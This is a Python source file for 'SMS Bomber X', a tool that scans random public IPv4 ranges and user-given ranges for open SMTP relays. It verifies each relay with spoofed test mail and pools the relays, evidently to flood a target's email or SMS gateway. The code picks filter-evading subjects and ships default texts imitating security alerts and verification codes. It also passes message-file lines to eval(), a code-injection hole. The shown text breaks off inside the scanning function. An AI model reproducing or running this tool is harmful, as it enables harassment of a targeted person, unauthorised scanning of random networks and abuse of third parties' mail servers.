#!/usr/bin/env python3
# __________                  __             __     ________             .___ 
# \______   \  ____    ____  |  | __  ____ _/  |_  /  _____/   ____    __| _/ 
#  |       _/ /  _ \ _/ ___\ |  |/ /_/ __ \\   __\/   \  ___  /  _ \  / __ |  
#  |    |   \(  <_> )\  \___ |    < \  ___/ |  |  \    \_\  \(  <_> )/ /_/ |  
#  |____|_  / \____/  \___  >|__|_ \ \___  >|__|   \______  / \____/ \____ |  
#         \/              \/      \/     \/               \/              \/  
#
# SMS Bomber X - Enhanced Edition
# Original by RocketGod, Enhancements inspired by user feedback
# https://github.com/RocketGod-git/smsbomber

# --- Standard Library Imports ---
import logging
import string
import smtplib
import time
import random
import socket
import ipaddress
import re
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor
import textwrap
import os
import json
import itertools
from pathlib import Path
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any, Tuple, Union # Added Union
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# --- Rich TUI Components ---
# Ensure 'rich' is installed: pip install rich
try:
    from rich.console import Console
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn
    from rich.prompt import Prompt, IntPrompt, Confirm, FloatPrompt # Added FloatPrompt
    from rich.table import Table
    from rich.live import Live
    from rich.logging import RichHandler
    from rich import box
    from rich.errors import MarkupError # Import specific error
except ImportError:
    print("Error: 'rich' library not found. Please install it using: pip install rich")
    exit(1) # Exit if essential TUI library is missing

# --- Configuration ---
CONFIG_DIR = Path.home() / ".smsbomberx"
PROFILES_DIR = CONFIG_DIR / "profiles"
RELAY_CACHE_FILE = CONFIG_DIR / "relay_cache.json"
LOG_FILE = CONFIG_DIR / "smsbomberx.log"
DEFAULT_PORTS = [25, 465, 587]
DEFAULT_TIMEOUT = 10
DEFAULT_SCAN_WORKERS = 100
DEFAULT_RELAY_POOL_TARGET = 5 # Try to find at least this many relays

# --- Ensure Configuration Directories Exist ---
try:
    CONFIG_DIR.mkdir(parents=True, exist_ok=True)
    PROFILES_DIR.mkdir(parents=True, exist_ok=True)
except OSError as e:
    print(f"Error creating configuration directories: {e}")
    # Consider if the script should exit here or try to continue without profile/cache features
    # For now, let's try to continue, logging/saving might fail later.

# --- Setup Logging ---
# File handler (logs more details potentially)
logging.basicConfig(
    level=logging.INFO, # Default level for the file log
    format="%(asctime)s [%(levelname)-7s] %(name)s: %(message)s", # Adjusted format slightly
    handlers=[logging.FileHandler(LOG_FILE, encoding='utf-8')], # Specify encoding
    force=True # Override any root logger configurations
)
# Rich handler for console output (can have a different level)
log = logging.getLogger(__name__) 
log.setLevel(logging.INFO) # Set level for this specific logger (adjust DEBUG, INFO, WARNING)
console = Console(record=True, force_terminal=True, width=120) # Force terminal, record for Live
rich_handler = RichHandler(
    console=console, 
    show_path=False, 
    level=logging.INFO, # Level specifically for console output
    log_time_format="[%X]", # Use shorter time format for console
    markup=True # Ensure RichHandler processes markup
    ) 
log.addHandler(rich_handler)

# --- Default Messages (if no file specified) ---
# Reduced default list for brevity, keep the existing structure if you have many
DEFAULT_MESSAGES = [
    "Service notification: Please verify your account activity.",
    "Reminder: Your appointment is scheduled soon.",
    "Security Alert: An unusual login attempt was detected.",
    "Promotional Code: Use SAVE10 for your next order.",
    "Did you know? SMS Bomber X provides enhanced features!",
    "System Update: Maintenance scheduled for tonight.",
    "Weather Alert: Severe weather conditions expected.",
    "Stay hydrated! - Your friendly bot",
    "Fact: Open SMTP relays are rare!",
    "Test message initiated by SMS Bomber X.",
    "Configuration update required. Please check settings.",
    "Your verification code is: {random.randint(100000, 999999)}", # Example dynamic message
    "Consider using a VPN for enhanced privacy.",
]

# --- Data Classes ---
@dataclass
class AppConfig:
    """Stores the application configuration."""
    target_email: str = ""
    message_count: int = 10
    delay_min: float = 2.0
    delay_max: float = 5.0
    scan_ports: List[int] = field(default_factory=lambda: list(DEFAULT_PORTS))
    scan_range_raw: str = "" # Raw user input for CIDR/host/IP
    scan_timeout: int = DEFAULT_TIMEOUT
    scan_workers: int = DEFAULT_SCAN_WORKERS
    relay_pool_target: int = DEFAULT_RELAY_POOL_TARGET
    message_file: Optional[str] = None
    use_relay_cache: bool = True
    load_previous_log: bool = True # Refers to open_smtp_servers.log
    profile_name: str = "default"
    
    def get_scan_network(self) -> Optional[Union[ipaddress.IPv4Network, ipaddress.IPv6Network]]:
        """Attempts to parse the raw scan range as an IP network."""
        if not self.scan_range_raw:
            return None
        try:
            # Allow both IPv4 and IPv6 networks
            return ipaddress.ip_network(self.scan_range_raw, strict=False)
        except ValueError:
            # Not a valid CIDR or IP network string
            return None 

    def get_scan_hosts(self) -> List[str]:
        """Returns a list of host IP addresses based on the configured scan range."""
        network = self.get_scan_network()
        if network:
            num_addresses = network.num_addresses
            # Provide warnings but don't prevent scanning unusual ranges
            if not (network.is_global or network.is_private or network.is_loopback):
                log.debug(f"Scan range {network} is neither public, private, nor loopback.")
                
            host_count_for_warning = 65536 # e.g., /16 or larger equivalent in IPv6
            if num_addresses > host_count_for_warning: 
                log.warning(f"Large range specified ({network} contains {num_addresses} addresses). Scanning may take a very long time.")
                # Consider adding interactive confirmation here if needed during runtime

            try:
                # Return list of host IPs within the network
                return [str(ip) for ip in network.hosts()]
            except TypeError:
                 # Handle cases like single-address networks (/32 or /128) where .hosts() might behave differently
                 if num_addresses == 1:
                      return [str(network.network_address)]
                 else:
                      log.warning(f"Could not determine hosts for network {network}, might be too large or misconfigured.")
                      return []

        elif self.scan_range_raw: 
            # If not a network, treat as a single hostname or IP
            log.debug(f"Treating '{self.scan_range_raw}' as a single host target.")
            return [self.scan_range_raw]
        else:
             # No range specified and wasn't a single host entry
             return [] 

    def generate_random_scan_hosts(self) -> List[str]:
        """Generates hosts from a random public /16 IPv4 range."""
        while True:
            # Generate first two octets, excluding private/reserved ranges
            first_octet = random.randint(1, 223) 
            # More specific exclusions
            if first_octet in [10, 127] or \
               (first_octet == 172 and 16 <= random.randint(0, 255) <= 31) or \
               (first_octet == 192 and random.randint(0, 255) == 168) or \
               (first_octet == 169 and random.randint(0, 255) == 254) or \
               (first_octet >= 224): # Exclude multicast too
                   continue
             
            second_octet = random.randint(0, 255)
            random_base = f"{first_octet}.{second_octet}.0.0"
            try:
                ip_net = ipaddress.ip_network(f"{random_base}/16", strict=False)
                # Check it's not any special-use category before proceeding
                if not (ip_net.is_private or ip_net.is_multicast or ip_net.is_reserved or ip_net.is_loopback or ip_net.is_link_local):
                    log.info(f"Generated random scan range: {ip_net}")
                    self.scan_range_raw = str(ip_net) # Update config with the generated range
                    return [str(ip) for ip in ip_net.hosts()]
            except ValueError:
                # Should be rare with generated IPs but handle just in case
                log.debug(f"Generated invalid network base? {random_base}. Retrying.")
                continue # Retry generating

@dataclass
class RelayInfo:
    """Stores information about a potential or confirmed SMTP relay."""
    host: str
    port: int
    status: str = "untested" # e.g., untested, working, failed, auth_required, timeout, refused, tls_failed, proto_error
    last_checked: float = 0.0 # Timestamp of last check
    success_count: int = 0
    failure_count: int = 0
    avg_response_time: Optional[float] = None # Future enhancement: track timing
    # Store the active connection object - marked non-representative and optional
    connection: Optional[Union[smtplib.SMTP, smtplib.SMTP_SSL]] = field(default=None, repr=False) 


# --- Helper Functions ---
def validate_email(email: str) -> bool:
    """Basic validation of email address format using regex."""
    if not email: return False
    # Simple regex, not fully RFC compliant but covers most common cases
    email_regex = r"^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]{2,}$"
    return re.match(email_regex, email) is not None

def random_string(length: int = 10) -> str:
    """Generates a random string of lowercase letters."""
    if length < 1: length = 1
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))

def load_messages(filepath: Optional[str]) -> List[str]:
    """Loads messages from a specified file or returns default messages."""
    messages_to_load = []
    source = "defaults"
    if filepath:
        message_path = Path(filepath)
        if message_path.is_file():
            try:
                with open(message_path, 'r', encoding='utf-8') as f:
                    messages_to_load = [line.strip() for line in f if line.strip()]
                if messages_to_load:
                    log.info(f"Loaded {len(messages_to_load)} messages from '{filepath}'")
                    source = filepath
                else:
                    log.warning(f"Message file '{filepath}' was empty. Using default messages.")
            except IOError as e:
                log.error(f"Error reading message file '{filepath}': {e}. Using default messages.")
            except Exception as e: # Catch other potential errors like decoding issues
                log.error(f"Unexpected error reading message file '{filepath}': {e}. Using default messages.")
        else:
             log.error(f"Message file '{filepath}' not found. Using default messages.")
    
    if not messages_to_load: # If file failed or wasn't specified
        log.info("Using default messages.")
        messages_to_load = DEFAULT_MESSAGES
        source = "defaults"

    # Simple dynamic message replacement (example)
    final_messages = []
    for msg in messages_to_load:
         try:
             # Allow basic f-string like formatting using random module
             formatted_msg = eval(f'f"""{msg}"""', {'random': random}) 
             final_messages.append(formatted_msg)
         except Exception as fmt_err:
             log.debug(f"Could not format message: '{msg}'. Error: {fmt_err}. Using literal message.")
             final_messages.append(msg) # Use the original string if formatting fails

    return final_messages

def parse_ports(port_str: str) -> List[int]:
    """Parses a comma-separated string of ports into a list of valid integers."""
    ports = set() # Use a set to automatically handle duplicates
    try:
        parts = port_str.split(',')
        for part in parts:
            part = part.strip()
            if not part: continue
            port_num = int(part)
            if 1 <= port_num <= 65535:
                ports.add(port_num)
            else:
                log.warning(f"Ignoring invalid port number: {port_num}")
        
        valid_ports = sorted(list(ports))
        if valid_ports:
            log.debug(f"Parsed ports: {valid_ports}")
            return valid_ports
        else:
             log.warning(f"No valid ports found in '{port_str}'. Using default ports: {DEFAULT_PORTS}")
             return list(DEFAULT_PORTS) # Return a copy
             
    except ValueError:
        log.error(f"Invalid characters in port string: '{port_str}'. Using default ports: {DEFAULT_PORTS}")
        return list(DEFAULT_PORTS) # Return a copy


# --- Relay Management ---
class RelayManager:
    """Manages the collection, caching, and status of potential SMTP relays."""
    def __init__(self, cache_file: Path, console: Console):
        self.cache_file = cache_file
        self.console = console
        # Known relays stored by (host, port) tuple for quick lookup
        self.known_relays: Dict[Tuple[str, int], RelayInfo] = {} 
        # List of relays currently considered active and having a connection
        self.active_relays: List[RelayInfo] = []
        # Iterator for round-robin cycling through active relays
        self._active_relay_cycler: Optional[itertools.cycle] = None
        self.load_cache() # Load existing cache on initialization

    def load_cache(self):
        """Loads relay information from the JSON cache file."""
        if self.cache_file.is_file(): # Use is_file() for Path object
            try:
                with open(self.cache_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                loaded_count = 0
                for key_str, relay_dict in data.items():
                    try:
                        # Robust parsing of key
                        if ':' not in key_str: continue # Skip invalid keys
                        host, port_str = key_str.rsplit(':', 1) # Use rsplit for IPv6 addresses
                        port = int(port_str)
                        
                        # Ensure dict contains valid keys for RelayInfo before attempting creation
                        valid_keys = RelayInfo.__annotations__.keys()
                        relay_info_data = {k: v for k, v in relay_dict.items() 
                                           if k in valid_keys and k != 'connection'} # Exclude connection explicitly
                        
                        # Only add if essential fields are present
                        if 'host' in relay_info_data and 'port' in relay_info_data:
                           # Basic type check for fields loaded from JSON
                           relay_info_data['port'] = int(relay_info_data['port'])
                           relay_info_data['last_checked'] = float(relay_info_data.get('last_checked', 0.0))
                           relay_info_data['success_count'] = int(relay_info_data.get('success_count', 0))
                           relay_info_data['failure_count'] = int(relay_info_data.get('failure_count', 0))
                           # avg_response_time might be None or float
                           if 'avg_response_time' in relay_info_data and relay_info_data['avg_response_time'] is not None:
                               relay_info_data['avg_response_time'] = float(relay_info_data['avg_response_time'])

                           relay = RelayInfo(**relay_info_data) 
                           self.known_relays[(relay.host, relay.port)] = relay
                           loaded_count += 1
                        else:
                            log.warning(f"Skipping cache entry {key_str}: Missing essential fields ('host', 'port').")
                             
                    except (ValueError, TypeError, KeyError) as e:
                        log.warning(f"Skipping invalid or corrupted entry in cache '{key_str}': {e}")
                log.info(f"Loaded {loaded_count} relays from cache: {self.cache_file}")
            except (json.JSONDecodeError, IOError) as e:
                log.error(f"Failed to load or parse relay cache '{self.cache_file}': {e}")
            except Exception as e:
                 log.error(f"Unexpected error loading relay cache: {e}", exc_info=True)
        else:
            log.info(f"Relay cache file not found: '{self.cache_file}'. Starting fresh.")
            
    def save_cache(self):
        """Saves the current state of known relays to the JSON cache file."""
        log.debug(f"Attempting to save {len(self.known_relays)} relays to cache...")
        data_to_save = {}
        for (host, port), relay_info in self.known_relays.items():
             # Create a dictionary representation, excluding the non-serializable 'connection'
             relay_dict = relay_info.__dict__.copy()
             relay_dict.pop('connection', None) 
             # Ensure last_checked is float (it should be, but safety)
             relay_dict['last_checked'] = float(relay_info.last_checked)
             data_to_save[f"{host}:{port}"] = relay_dict
             
        try:
            # Ensure parent directory exists before writing
            self.cache_file.parent.mkdir(parents=True, exist_ok=True)
            with open(self.cache_file, 'w', encoding='utf-8') as f:
                json.dump(data_to_save, f, indent=2, ensure_ascii=False)
            log.info(f"Relay cache saved successfully to {self.cache_file}")
        except (IOError, TypeError) as e:
            log.error(f"Failed to save relay cache '{self.cache_file}': {e}")
        except Exception as e:
             log.error(f"Unexpected error saving relay cache: {e}", exc_info=True)

    def add_or_update_relay(self, host: str, port: int, status: str, connection: Optional[Union[smtplib.SMTP, smtplib.SMTP_SSL]] = None):
        """Adds a new relay or updates the status of an existing one."""
        key = (host, port)
        now = time.time()
        is_working = (status == 'working')

        if key in self.known_relays:
            # Update existing relay
            relay = self.known_relays[key]
            relay.status = status
            relay.last_checked = now
            if is_working:
                relay.success_count += 1
                relay.failure_count = 0 # Reset failure count on success
                if connection: # Only store connection if provided (implies success)
                    # If it already has a connection object (e.g. from previous check), close old one? Let's assume caller handles this.
                    relay.connection = connection 
                    if relay not in self.active_relays: # Add to active if not already there
                        self.active_relays.append(relay)
                        log.debug(f"Added/Reactivated relay {host}:{port} in active pool.")
            else: # Status indicates failure
                relay.failure_count += 1
                # If it failed, ensure connection is closed and removed from active pool
                if relay.connection: # Close any existing connection
                     try: 
                         relay.connection.quit() 
                         log.debug(f"Closed connection for failed relay {host}:{port}")
                     except: pass # Ignore errors on quit
                     relay.connection = None

                if relay in self.active_relays: # Remove from active list
                    try:
                        self.active_relays.remove(relay)
                        log.debug(f"Removed failed/inactive relay {host}:{port} from active pool.")
                    except ValueError:
                        log.debug(f"Relay {host}:{port} already removed from active pool.")
                        pass # Already removed, potentially by another thread/check
        else:
            # Add new relay
            relay = RelayInfo(host=host, port=port, status=status, last_checked=now)
            if is_working:
                relay.success_count = 1
                if connection:
                    relay.connection = connection
                    self.active_relays.append(relay)
                    log.debug(f"Added NEW working relay {host}:{port} to active pool.")
            else:
                relay.failure_count = 1
            self.known_relays[key] = relay # Add to the main dictionary
            
        # Reset the cycler whenever the active pool might have changed
        # Only cycle if there are active relays
        self._active_relay_cycler = itertools.cycle(self.active_relays) if self.active_relays else None


    def get_scan_targets(self, config: AppConfig, previous_log_ips: List[str]) -> List[Dict[str, Any]]:
        """Prepares the list of target dictionaries ({'host', 'port', 'source'}) for scanning."""
        targets: List[Dict[str, Any]] = []
        # Use a set to efficiently track hosts/ports already added
        processed: set[Tuple[str, int]] = set() 

        # 1. Prioritize relays from the cache based on past success/recency
        if config.use_relay_cache:
            # Sort criteria: working first, then by success count (desc), failure count (asc), last checked (desc)
            sorted_cached_relays = sorted(
                self.known_relays.values(), 
                key=lambda r: (
                    r.status == 'working', # True comes before False
                    r.success_count, 
                    -r.failure_count, # Negate to sort ascending failures
                    r.last_checked 
                ),
                reverse=True # Sort descending by primary criteria
            )
            cache_targets_added = 0
            for relay in sorted_cached_relays:
                key = (relay.host, relay.port)
                if key not in processed:
                    targets.append({'host': relay.host, 'port': relay.port, 'source': 'cache'})
                    processed.add(key)
                    cache_targets_added += 1
            log.debug(f"Added {cache_targets_added} targets from cache.")

        # 2. Add relays from the legacy log file if enabled
        if config.load_previous_log and previous_log_ips:
            log_targets_added = 0
            for item in previous_log_ips:
                try:
                    # Handle potential format variations, use rsplit for IPv6 safety
                    if ':' not in item: continue 
                    host, port_str = item.rsplit(':', 1)
                    port = int(port_str)
                    key = (host, port)
                    if key not in processed:
                        targets.append({'host': host, 'port': port, 'source': 'log'})
                        processed.add(key)
                        log_targets_added += 1
                except (ValueError, IndexError):
                    log.warning(f"Skipping invalid entry from previous log: '{item}'")
            log.debug(f"Added {log_targets_added} targets from legacy log.")
            
        # 3. Add targets from the user-specified range/host or generated random range
        range_targets_added = 0
        # Ensure base_hosts gets generated only if scan_range_raw is empty initially
        base_hosts: List[str] = []
        if not config.scan_range_raw:
             log.info("No scan range provided, generating random target range.")
             base_hosts = config.generate_random_scan_hosts()
        else:
             base_hosts = config.get_scan_hosts()
             if not base_hosts and config.scan_range_raw: # Input was given but didn't resolve to hosts
                 log.warning(f"Could not resolve scan target '{config.scan_range_raw}' to any hosts.")

        if base_hosts:
            for host in base_hosts:
                for port in config.scan_ports:
                    key = (host, port)
                    if key not in processed:
                        targets.append({'host': host, 'port': port, 'source': 'scan_range'})
                        processed.add(key)
                        range_targets_added += 1
            log.debug(f"Added {range_targets_added} targets from configured/generated scan range/host across {len(config.scan_ports)} port(s).")

        log.info(f"Prepared a total of {len(targets)} unique targets for scanning.")
        # Shuffle targets to potentially distribute load better across subnets if scanning large ranges
        random.shuffle(targets) 
        log.debug("Shuffled scan targets order.")
        return targets

    def get_next_active_relay(self) -> Optional[RelayInfo]:
        """Cycles through the active relay list and returns the next available one."""
        if not self.active_relays:
            log.debug("Cannot get next relay: Relay pool is empty.")
            return None
            
        # Initialize cycler if it doesn't exist or is exhausted (though cycle shouldn't exhaust)
        if self._active_relay_cycler is None:
            log.debug("Initializing active relay cycler.")
            self._active_relay_cycler = itertools.cycle(self.active_relays)
        
        # Try getting the next relay, but iterate max pool size times to prevent infinite loops
        # This is important if relays are being removed concurrently or cycler behaves oddly
        initial_pool_size = len(self.active_relays)
        for _ in range(initial_pool_size + 1): # +1 for safety margin
            try:
                relay = next(self._active_relay_cycler)
                
                # Crucial Check: Is the relay still in the *current* active_relays list?
                # AND does it still have its connection object?
                if relay in self.active_relays and relay.connection:
                    log.debug(f"Returning next active relay: {relay.host}:{relay.port}")
                    # --- Optional but Recommended: NOOP Check ---
                    # Uncomment to add a quick check if the server is still responding. 
                    # This adds latency but increases reliability.
                    # try:
                    #     relay.connection.noop()
                    #     log.debug(f"Relay {relay.host}:{relay.port} passed NOOP check.")
                    # except (smtplib.SMTPServerDisconnected, smtplib.SMTPException, socket.error) as noop_err:
                    #     log.warning(f"Relay {relay.host}:{relay.port} failed NOOP check ({noop_err}). Marking failed.")
                    #     self.mark_relay_failed(relay, "noop_failed")
                    #     continue # Try the next one in the cycle
                    # except Exception as noop_unexpected_err:
                    #      log.error(f"Unexpected error during NOOP check for {relay.host}:{relay.port}: {noop_unexpected_err}")
                    #      self.mark_relay_failed(relay, "noop_error")
                    #      continue
                    # --- End Optional NOOP Check ---
                    return relay # Found a valid, active relay
                else:
                    # This relay was likely removed from active_relays since the cycle started
                    log.debug(f"Skipping relay {relay.host}:{relay.port} from cycle; it's no longer active or lost connection.")
                    # Let the loop continue to find the next valid one
            
            except StopIteration:
                # Should not happen with itertools.cycle unless the list became empty mid-iteration
                log.debug("Relay cycler stopped. Re-initializing if pool still has relays.")
                self._active_relay_cycler = itertools.cycle(self.active_relays) if self.active_relays else None
                if not self.active_relays: return None # Pool is now confirmed empty
                # Continue loop to try getting the next item after re-initializing
            except Exception as e:
                log.error(f"Unexpected error while getting next relay: {e}", exc_info=True)
                # Attempt to recover by resetting the cycle, return None for this attempt
                self._active_relay_cycler = itertools.cycle(self.active_relays) if self.active_relays else None
                return None

        # If loop completes without returning a relay
        log.warning("Cycled through available relays but couldn't find a valid active one.")
        return None


    def mark_relay_failed(self, relay_info: RelayInfo, reason: str = "send_error"):
        """Marks a specific relay as failed, providing a reason."""
        # Check if relay_info is valid before proceeding
        if not relay_info or not hasattr(relay_info, 'host') or not hasattr(relay_info, 'port'):
             log.error(f"Attempted to mark an invalid RelayInfo object as failed. Reason: {reason}")
             return

        log.warning(f"Marking relay {relay_info.host}:{relay_info.port} as failed. Reason: {reason}.")
        # Use add_or_update_relay, which handles status update, connection closing, and removal from active pool
        self.add_or_update_relay(relay_info.host, relay_info.port, status=reason) 


    def close_all_connections(self):
        """Attempts to cleanly quit all active SMTP connections."""
        if not self.active_relays:
            log.info("No active relay connections to close.")
            return
            
        log.info(f"Attempting to close {len(self.active_relays)} active relay connections...")
        # Iterate over a copy of the list, as closing modifies the original indirectly via add_or_update_relay
        active_copy = list(self.active_relays) 
        closed_count = 0
        for relay in active_copy:
            # Ensure connection exists before trying to close
            if relay.connection:
                log.debug(f"Closing connection to {relay.host}:{relay.port}...")
                try:
                    relay.connection.quit() # Graceful SMTP QUIT
                    closed_count += 1
                except (smtplib.SMTPServerDisconnected, smtplib.SMTPException, socket.error) as e:
                    # Ignore errors on quit, as connection might be dead already.
                    log.debug(f"Ignored error during quit for {relay.host}:{relay.port}: {e}")
                except Exception as e:
                    # Log other unexpected errors during the quit process
                    log.warning(f"Unexpected error quitting {relay.host}:{relay.port}: {e}")
                finally:
                     # Important: Set connection attribute to None regardless of quit success/failure
                     relay.connection = None
            
            # Ensure it's removed from the main active_relays list if not already done by mark_relay_failed
            # This covers cases where cleanup happens without an explicit failure status update.
            if relay in self.active_relays:
                try:
                    self.active_relays.remove(relay)
                    log.debug(f"Relay {relay.host}:{relay.port} removed from active pool during final cleanup.")
                except ValueError:
                    pass # Already removed

        # Explicitly clear the list and cycler after processing all
        # Although elements were removed individually, this ensures consistency.
        self.active_relays.clear() 
        self._active_relay_cycler = None
        log.info(f"Finished closing connections. {closed_count} explicitly quit (or attempted). Pool cleared.")


# --- Scanning Logic ---
def test_single_relay(target: Dict[str, Any], timeout: int) -> Tuple[Dict[str, Any], Optional[Union[smtplib.SMTP, smtplib.SMTP_SSL]], str]:
    """
    Tests a single host:port combination for open SMTP relay capability.
    Returns the original target dict, the smtplib server object (if successful), and a status string.
    """
    hostname = target['host']
    port = target['port']
    server: Optional[Union[smtplib.SMTP, smtplib.SMTP_SSL]] = None
    status: str = "failed" # Default status if tests don't complete successfully

    try:
        log.debug(f"Testing relay target: {hostname}:{port}")
        # Use unique enough sender/receiver for testing without easily triggering basic filters
        sender_local = random_string(8)
        sender_domain = f"{random_string(6)}.test" # Using .test TLD is safer
        sender = f"{sender_local}@{sender_domain}" 
        receiver = f"test-recipient-{random.randint(1000,9999)}@example.com" # example.com is standard for testing
        
        start_time = time.monotonic() # For potential future timing metrics
        
        # --- Step 1: Establish Connection (handling different port conventions) ---
        resolved_host = hostname # Keep original if connection fails for logging
        try:
             # Optionally resolve hostname here if needed, though smtplib handles it
             # resolved_host = socket.gethostbyname(hostname) 
             # log.debug(f"Resolved {hostname} to {resolved_host}")
             pass
        except socket.gaierror as dns_err:
              log.debug(f"DNS lookup failed for {hostname}: {dns_err}")
              return target, None, "dns_error" # Return early on DNS failure

        if port == 465:
            # Port 465 typically uses Implicit SSL/TLS from the start
            log.debug(f"Connecting via SMTP_SSL to {resolved_host}:{port} (Timeout: {timeout}s)")
            server = smtplib.SMTP_SSL(resolved_host, port, timeout=timeout)
            # Send EHLO after connection established
            server.ehlo(sender_domain) # Use domain for ehlo
        else:
            # Ports 25, 587 typically start plain, then may use STARTTLS
            log.debug(f"Connecting via SMTP to {resolved_host}:{port} (Timeout: {timeout}s)")
            server = smtplib.SMTP(resolved_host, port, timeout=timeout)
            server.ehlo(sender_domain) # Initial EHLO
            if port == 587: 
                # Port 587 (Submission) usually requires STARTTLS
                log.debug(f"Checking STARTTLS support on {resolved_host}:{port}...")
                if server.has_extn('starttls'):
                    log.debug(f"Attempting STARTTLS on {resolved_host}:{port}...")
                    try:
                        server.starttls()
                        # Re-issue EHLO after successful STARTTLS for capabilities negotiation
                        server.ehlo(sender_domain) 
                        log.debug(f"STARTTLS successful on {resolved_host}:{port}")
                    except smtplib.SMTPException as tls_error:
                        log.warning(f"STARTTLS command failed on {resolved_host}:{port}: {tls_error}")
                        status = "starttls_failed"
                        # Try graceful quit before returning
                        try: server.quit()
                        except: pass
                        return target, None, status # Return early if STARTTLS fails on 587
                else:
                    log.warning(f"Server {resolved_host}:{port} (Port 587) does not advertise STARTTLS support.")
                    # Decide if this constitutes failure - yes, standard requires STARTTLS on 587 for submission
                    status = "starttls_unsupported"
                    # Try graceful quit before returning
                    try: server.quit()
                    except: pass 
                    return target, None, status

        # --- Step 2: Prepare and Send Test Message to check Relay ---
        msg = MIMEMultipart('alternative')
        msg['From'] = sender
        msg['To'] = receiver
        msg['Subject'] = f'Connectivity Test {random_string(5)}' # Less suspicious subject
        msg['Date'] = smtplib.email.utils.formatdate(localtime=True) # Add Date header
        # Use a unique Message-ID to potentially avoid trivial duplicate rejection
        msg['Message-ID'] = smtplib.make_msgid(domain=sender_domain) 
        # Simple plain text body
        msg_body = f"Relay test initiated {time.time()} from host."
        msg.attach(MIMEText(msg_body, 'plain', 'utf-8')) # Ensure UTF-8
        
        log.debug(f"Attempting relay test send: {sender} -> {receiver} via {resolved_host}:{port}")
        
        # The core test: Can we send from our fake sender to fake receiver?
        server.sendmail(sender, [receiver], msg.as_string()) # recipient should be a list
        
        # --- Step 3: Success ---
        # If sendmail did not raise an exception, assume relaying worked
        end_time = time.monotonic()
        response_time = end_time - start_time
        log.info(f"[bold green]SUCCESS[/]: Open relay confirmed at {hostname}:{port} (Resolved: {resolved_host}, Time: {response_time:.2f}s)")
        status = "working"
        # Keep the connection object open and return it
        return target, server, status

    # --- Error Handling during connection or sending ---
    except smtplib.SMTPAuthenticationError:
        log.info(f"{hostname}:{port} requires authentication. Not an open relay.")
        status = "auth_required"
    except smtplib.SMTPRecipientsRefused as e:
        # This is expected if it's NOT an open relay
        log.debug(f"Recipient '{receiver}' refused by {hostname}:{port}. Not an open relay. ({e})")
        status = "recipient_refused" 
    except smtplib.SMTPSenderRefused as e:
        log.debug(f"Sender '{sender}' refused by {hostname}:{port}. Likely not an open relay or anti-spam. ({e})")
        status = "sender_refused"
    except smtplib.SMTPHeloError as e:
        log.warning(f"HELO/EHLO error with {hostname}:{port}: {e}")
        status = "proto_error_helo"
    except smtplib.SMTPDataError as e:
        # Errors after sending DATA command
        log.warning(f"SMTP data error during test send for {hostname}:{port}: {e}")
        status = "proto_error_data"
    except smtplib.SMTPConnectError as e:
        # Specific error for connection failure reported by smtplib
        log.debug(f"SMTP library reported connection error for {hostname}:{port}: {e}")
        status = "connect_failed_smtp"
    except smtplib.SMTPNotSupportedError as e:
        # E.g., STARTTLS called when not supported
        log.warning(f"SMTP feature not supported by {hostname}:{port}: {e}")
        status = "feature_unsupported"
    except smtplib.SMTPResponseException as e:
        # Catch other general SMTP protocol errors with status codes
        log.warning(f"Unexpected SMTP response from {hostname}:{port}: {e.smtp_code} {e.smtp_error}")
        status = f"smtp_error_{e.smtp_code}" # Include code in status if possible
    except smtplib.SMTPException as e:
        # Catch-all for other smtplib-specific exceptions
        log.warning(f"General SMTP exception with {hostname}:{port}: {e}")
        status = "smtp_error_general"
    except socket.timeout:
        log.debug(f"Connection timed out for {hostname}:{port}")
        status = "timeout"
    # Removed gaierror handler here as it's caught earlier
    except (socket.error, OSError) as e: 
        # Lower-level socket errors (e.g., Connection refused, Network unreachable)
        # Use hostname here as resolved_host might not be set if connection failed early
        log.debug(f"Socket/OS error connecting to {hostname}:{port}: {e}")
        status = "socket_error"
    except Exception as e:
        # Catch any other unexpected Python errors during the process
        log.error(f"Unexpected Python error during test of {hostname}:{port}: {e}", exc_info=True) # Log full traceback
        status = "unknown_error"
        
    # --- Cleanup: Ensure connection is closed if an error occurred ---
    if server:
        try:
            # Try to gracefully quit the connection
            server.quit()
        except Exception: # Ignore any errors during cleanup quit
            pass
            
    # Return the target info, None for connection object, and the determined status string
    return target, None, status

def run_scan(config: AppConfig, relay_manager: RelayManager, previous_log_ips: List[str], progress: Progress) -> None:
    """Manages the parallel scanning of potential relays using ThreadPoolExecutor."""
    
    # Prepare the list of targets to check, including prioritizing from cache/log
    scan_targets = relay_manager.get_scan_targets(config, previous_log_ips)
    if not scan_targets:
        log.warning("Scan initiated, but no targets were identified (check range, cache, log settings).")
        # Add a dummy task to show completion immediately if desired, or just return
        try: # Safely add progress task
           scan_task_id = progress.add_task("[yellow]Scan Skipped (No Targets)", total=1, completed=1) 
           progress.update(scan_task_id, completed=1) # Mark complete
        except Exception as prog_err:
             log.error(f"Error adding skip task to progress: {prog_err}")
        return

    # --- Setup Progress Bar Task for Scanning ---
    try:
         task_scan_id = progress.add_task("[cyan]Scanning Relays", total=len(scan_targets), start=True)
    except Exception as prog_err:
        log.error(f"Failed to add scan task to progress bar: {prog_err}")
        return # Cannot proceed without progress task safely

    found_count = 0
    tested_count = 0
    
    # Determine max workers, ensuring it's at least 1 and not excessively large
    max_workers = min(config.scan_workers, len(scan_targets), os.cpu_count() * 10 if os.cpu_count() else 100) # Cap relative to CPUs
    if max_workers <= 0: max_workers = 1 
    log.info(f"Starting relay scan with up to {max_workers} concurrent workers.")

    # Keep track of submitted futures
    futures: Set[concurrent.futures.Future] = set()
    scan_stopped_early = False
    executor_instance : Optional[ThreadPoolExecutor] = None # To reference for shutdown

    try:
        # --- Execute Tests in Parallel ---
        with ThreadPoolExecutor(max_workers=max_workers, thread_name_prefix="Scanner_") as executor:
            executor_instance = executor # Keep ref for potential early shutdown
            # Submit initial batch of tasks
            for target in scan_targets:
                # Check if we've already found enough relays (and target is non-zero)
                if config.relay_pool_target > 0 and len(relay_manager.active_relays) >= config.relay_pool_target:
                    log.info(f"Relay pool target ({config.relay_pool_target}) reached. Halting submission of new scan tasks.")
                    scan_stopped_early = True
                    # Don't break immediately, let already submitted tasks finish unless explicitly cancelling below
